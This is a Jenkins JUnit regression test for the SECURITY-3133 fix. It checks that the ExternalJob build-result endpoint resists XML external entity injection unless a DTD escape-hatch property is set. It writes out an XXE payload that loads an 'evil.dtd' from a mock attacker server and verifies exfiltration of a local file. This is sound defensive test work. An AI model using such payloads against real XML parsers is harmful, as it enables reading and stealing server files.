package hudson.model;

import com.github.tomakehurst.wiremock.client.WireMock;

import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import com.github.tomakehurst.wiremock.junit5.WireMockExtension;
import org.apache.commons.io.IOUtils;
import org.htmlunit.HttpMethod;
import org.htmlunit.WebRequest;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.RegisterExtension;
import org.jvnet.hudson.test.Issue;
import org.jvnet.hudson.test.JenkinsRule;
import org.jvnet.hudson.test.junit.jupiter.WithJenkins;

import static com.github.tomakehurst.wiremock.client.WireMock.aResponse;
import static com.github.tomakehurst.wiremock.client.WireMock.urlEqualTo;
import static com.github.tomakehurst.wiremock.client.WireMock.urlPathMatching;
import static com.github.tomakehurst.wiremock.core.WireMockConfiguration.options;
import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.notNullValue;

@WithJenkins
class Security3133Test {

    private JenkinsRule j;

    private String enableDtd;

    @RegisterExtension
    static WireMockExtension wireMockRule = WireMockExtension.newInstance().options(options().dynamicPort()).build();

    @BeforeEach
    void setUp(JenkinsRule rule) {
        j = rule;
        enableDtd = System.clearProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME);
    }

    @AfterEach
    void tearDown() {
        if (enableDtd != null) {
            System.setProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME, enableDtd);
        }
    }

    @Issue("SECURITY-3133")
    @Test
    void testExternalJobXXE() throws Throwable {
        System.setProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME, "true");
        tryXXE(1,1);
    }

    @Issue("SECURITY-3133")
    @Test
    void testExternalJobXXEProtectedWithPropertyFalse() throws Throwable {
        System.setProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME, "false");
        tryXXE(0,0);
    }

    @Issue("SECURITY-3133")
    @Test
    void testExternalJobXXEProtectedDefault() throws Throwable {
        assertThat("Escape hatch property for SECURITY-3133 not null", System.getProperty(ExternalRun.ENABLE_DTD_PROPERTY_NAME) == null);
        tryXXE(0,0);
    }

    private void tryXXE(int dtdDownloads, int xxeTimes) throws Exception {
        wireMockRule.stubFor(WireMock.get(urlPathMatching("/evil.dtd.*"))
                .willReturn(aResponse()
                        .withBody(getDTDFile(wireMockRule.baseUrl()))));
        wireMockRule.stubFor(WireMock.get(urlPathMatching("/file.*"))
                .willReturn(aResponse()));

        setUpJobAndMakeEvilRequest();

        wireMockRule.verify(dtdDownloads, WireMock.getRequestedFor(urlPathMatching("/evil.dtd.*")));
        wireMockRule.verify(xxeTimes, WireMock.getRequestedFor(urlEqualTo("/file?x=local")));
    }
    private String getDTDFile(String baseUrl) throws Exception {
        String toLoad = Security3133Test.class.getSimpleName() + "/evil.dtd";
        try (InputStream resource = Security3133Test.class.getResourceAsStream(toLoad)) {
            assertThat("could not load resource " + toLoad, resource, notNullValue());
            return replaceLocalFile(IOUtils.toString(resource, StandardCharsets.UTF_8).replace("BASE_URL", baseUrl));
        }
    }
    private void setUpJobAndMakeEvilRequest() throws IOException {
        j.jenkins.createProject(ExternalJob.class, "externalJob");
        String xml = ("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"BASE_URL/evil.dtd\"> %xxe;]><foo>bar</foo>")
                .replace("BASE_URL", wireMockRule.baseUrl());
        System.out.println(xml);
        try (JenkinsRule.WebClient webClient = j.createWebClient().withThrowExceptionOnFailingStatusCode(false)) {
            URL postURL = webClient.createCrumbedUrl("job/externalJob/postBuildResult");
            webClient.loadWebResponse(createRequest(postURL, xml)).getStatusCode();
        }
    }
    private WebRequest createRequest(URL urlToCall, String xml) {
        WebRequest postRequest = new WebRequest(urlToCall, HttpMethod.POST);

        postRequest.setAdditionalHeader("Content-Type", "application/xml");
        postRequest.setRequestBody(xml);
        return postRequest;
    }
    private String replaceLocalFile(String string) {
        URL url = Security3133Test.class.getResource(Security3133Test.class.getSimpleName() + "/local.txt");
        return string.replaceAll("LOCAL_FILE", url.toString());
    }
}
